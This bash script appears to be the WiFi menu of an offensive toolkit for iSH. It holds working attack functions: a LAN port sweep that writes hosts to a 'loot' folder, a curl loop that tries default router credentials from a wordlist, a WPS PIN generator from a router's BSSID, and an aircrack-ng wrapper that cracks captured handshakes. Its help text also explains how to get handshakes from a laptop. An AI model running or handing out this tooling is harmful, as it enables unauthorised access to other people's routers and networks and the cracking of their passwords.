#!/usr/bin/env bash

m_wifi() {
  while :; do
    printf '\n%s\n' "${B}${MAG}WiFi & Router${R}"
    printf ' 1) LAN sweep\n 2) router default creds\n 3) WPS PIN from BSSID\n'
    printf ' 4) crack a .cap\n 5) MAC vendor\n 6) why no deauth?\n 0) back\n'
    printf '%s' "${BLU}wifi>${R}"; read -r c
    case "$c" in
      1) wifi_sweep; pause ;;
      2) wifi_router_brute; pause ;;
      3) wifi_wps; pause ;;
      4) wifi_crack; pause ;;
      5) wifi_vendor; pause ;;
      6) wifi_limits; pause ;;
      0) return ;;
    esac
  done
}

wifi_sweep() {
  local ip net out
  ip=$(myip)
  [ -z "$ip" ] && { err "no LAN address — WiFi on? Local Network permission granted?"; return 1; }
  net="${ip%.*}"
  info "you: $ip   gateway: $(gateway)"
  warn "/24 connect sweep, ~1s/host"
  out="$(lootdir)/hosts.txt"; : > "$out"
  for i in $(seq 1 254); do
    for p in 80 443 22 445 62078 8080; do
      if tcpup "$net.$i" "$p"; then printf '%s:%s\n' "$net.$i" "$p" | tee -a "$out"; break; fi
    done
  done
  ok "saved → $out"
}

wifi_router_brute() {
  local gw u p code
  gw=$(askdef "router IP" "$(gateway)")
  info "testing default creds against http://$gw/"
  while IFS=: read -r u p; do
    [ -z "$u" ] && continue
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 -u "$u:$p" "http://$gw/")
    printf '  %-22s %s\n' "$u:$p" "$code"
    case "$code" in 200|302) ok "hit: $u:$p" ;; esac
  done < "$ROOT_DIR/wordlists/router_defaults.txt"
  info "covers basic-auth only — form logins differ per vendor"
}

wifi_wps() {
  local mac
  mac=$(ask "router BSSID aa:bb:cc:dd:ee:ff")
  python3 - "$mac" <<'PY'
import sys
m = sys.argv[1].lower().replace('-', ':').split(':')
if len(m) != 6: sys.exit("bad MAC")
def acc(shift):
    s = 0
    for i in range(6): s += int(m[i], 16) << (shift * i)
    p = 0
    while s: p += s & 0xF; s >>= 4
    return ((p % 15) + 1) * 10
pin = (("%d%d" % (acc(5), acc(4))) + "00000000")[:7]
c = sum(int(d) * (3 if i % 2 == 0 else 1) for i, d in enumerate(pin))
print("candidate:", pin + str((10 - c % 10) % 10))
PY
  info "only works on routers with WPS still enabled"
}

wifi_crack() {
  local cap wl
  cap=$(ask "path to .cap"); [ -f "$cap" ] || { err "not found"; return 1; }
  wl=$(askdef "wordlist" "$ROOT_DIR/wordlists/pwdsmall.txt")
  aircrack-ng -w "$wl" "$cap"
}

wifi_vendor() {
  local mac
  mac=$(ask "MAC or OUI")
  curl -s --max-time 10 "https://api.macvendors.com/$mac"; echo
}

wifi_limits() {
  warn "no wlan0 — iSH never touches the radio"
  printf '%s\n' "  no monitor mode, no deauth, no beacon flood, no handshake capture."
  printf '%s\n' "  to get handshakes: capture on a laptop, copy the .cap here, use option 4."
  printf '%s\n' "  inbound is blocked by slirp — nothing you host here is reachable from your LAN."
}
